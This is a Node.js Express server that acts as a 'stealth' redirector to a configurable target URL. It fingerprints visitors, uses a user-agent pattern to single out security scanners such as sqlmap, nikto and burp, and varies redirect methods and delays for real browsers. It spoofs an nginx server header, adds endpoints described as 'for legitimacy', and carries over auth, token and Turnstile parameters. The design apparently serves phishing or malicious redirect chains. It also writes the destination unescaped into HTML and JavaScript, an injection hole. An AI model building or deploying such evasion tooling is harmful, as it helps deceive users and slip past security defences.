const express = require('express');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 3000;

// Stealth Configuration
const CONFIG = {
  target: process.env.TARGET_URL,
  mode: process.env.MODE || 'stealth',
  security: {
    preserveParams: true,
    varyResponses: true,
    delayTactics: true
  }
};

// Advanced Obfuscation Engine
class StealthEngine {
  static generateFingerprint(req) {
    return {
      session: crypto.createHash('md5').update(req.ip + req.get('User-Agent') + Date.now()).digest('hex').substring(0, 12),
      timestamp: Date.now(),
      ip: req.ip,
      ua: req.get('User-Agent') || ''
    };
  }

  static analyzeRequest(req) {
    const ua = req.get('User-Agent') || '';
    
    return {
      isScanner: /(nikto|sqlmap|nmap|metasploit|burp|acunetix|nessus|wpscan|dirb|gobuster)/i.test(ua),
      isBot: /(bot|crawl|spider|facebookexternalhit|twitterbot|linkedinbot)/i.test(ua),
      isBrowser: /(mozilla|chrome|safari|firefox|edge)/i.test(ua) && !/(bot|crawl)/i.test(ua),
      hasCF: req.headers['cf-connecting-ip'] || req.headers['cf-ray']
    };
  }

  static getRedirectMethod(analysis) {
    const methods = ['header', 'meta', 'js', 'interactive'];
    
    if (analysis.isScanner) return 'header';
    if (analysis.isBot) return 'meta';
    if (analysis.isBrowser) {
      // Randomize for real users
      return methods[Math.floor(Math.random() * methods.length)];
    }
    return 'header';
  }

  static calculateDelay(method) {
    const delays = {
      'header': 0,
      'meta': Math.random() * 2000 + 500,
      'js': Math.random() * 3000 + 1000,
      'interactive': 0
    };
    return delays[method];
  }
}

// Parameter Preservation System
class ParamHandler {
  static extractCriticalParams(query) {
    const critical = {};
    const keys = Object.keys(query);
    
    keys.forEach(key => {
      // Preserve all parameters including Turnstile
      if (key.includes('cf_') || key.includes('__cf') || key.includes('token') || key.includes('auth')) {
        critical[key] = query[key];
      }
    });
    
    return critical;
  }

  static buildDestination(baseUrl, originalUrl, query, criticalParams) {
    const url = new URL(baseUrl);
    
    // Preserve path
    if (originalUrl !== '/') {
      url.pathname = originalUrl;
    }
    
    // Preserve all original parameters
    Object.keys(query).forEach(key => {
      url.searchParams.set(key, query[key]);
    });
    
    // Ensure critical parameters are included
    Object.keys(criticalParams).forEach(key => {
      if (!url.searchParams.has(key)) {
        url.searchParams.set(key, criticalParams[key]);
      }
    });
    
    return url.toString();
  }
}

// Stealth Middleware
app.use((req, res, next) => {
  // Remove all identifying headers
  res.removeHeader('X-Powered-By');
  res.removeHeader('X-Runtime');
  res.removeHeader('X-Node');
  
  // Apply generic but realistic headers
  res.setHeader('Server', 'nginx');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  
  next();
});

// Essential endpoints for legitimacy
app.get('/robots.txt', (req, res) => {
  res.type('text/plain');
  res.send('User-agent: *\nAllow: /');
});

app.get('/favicon.ico', (req, res) => {
  res.status(204).end();
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Main redirect handler
app.get('*', (req, res) => {
  const fingerprint = StealthEngine.generateFingerprint(req);
  const analysis = StealthEngine.analyzeRequest(req);
  const method = StealthEngine.getRedirectMethod(analysis);
  const delay = StealthEngine.calculateDelay(method);
  const criticalParams = ParamHandler.extractCriticalParams(req.query);
  
  const destination = ParamHandler.buildDestination(
    CONFIG.target,
    req.originalUrl,
    req.query,
    criticalParams
  );
  
  // Minimal security logging
  console.log(JSON.stringify({
    t: new Date().toISOString(),
    s: fingerprint.session,
    m: method,
    p: req.path,
    ua: analysis.isBrowser ? 'browser' : 'other'
  }));
  
  // Execute redirect based on method
  executeRedirect(method, destination, delay, res);
});

// Redirect execution methods
function executeRedirect(method, destination, delay, res) {
  switch (method) {
    case 'header':
      res.redirect(302, destination);
      break;
      
    case 'meta':
      res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <meta http-equiv="refresh" content="${delay/1000};url=${destination}">
  <style>
    body { font-family: system-ui; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .loader { text-align: center; }
    .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader">
    <div class="spinner"></div>
    <p>Loading content...</p>
  </div>
</body>
</html>`);
      break;
      
    case 'js':
      res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <style>
    body { font-family: Arial; background: #fff; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .container { text-align: center; }
    .progress { width: 200px; height: 4px; background: #eee; margin: 20px auto; border-radius: 2px; overflow: hidden; }
    .progress-bar { height: 100%; background: #007cba; width: 0%; animation: load ${delay/1000}s ease-in-out; }
    @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
  </style>
</head>
<body>
  <div class="container">
    <p>Please wait while we redirect you...</p>
    <div class="progress"><div class="progress-bar"></div></div>
  </div>
  <script>
    setTimeout(() => window.location.href = "${destination}", ${delay});
  </script>
</body>
</html>`);
      break;
      
    case 'interactive':
      res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Continue</title>
  <style>
    body { font-family: system-ui; background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
    .btn { background: #007cba; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }
    .btn:hover { background: #005a87; }
  </style>
</head>
<body>
  <div class="card">
    <p>Click to continue to the destination</p>
    <button class="btn" onclick="window.location.href='${destination}'">Continue</button>
  </div>
</body>
</html>`);
      break;
  }
}

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Service active on port ${PORT}`);
  console.log(`Target: ${CONFIG.target}`);
  console.log(`Mode: ${CONFIG.mode}`);

});

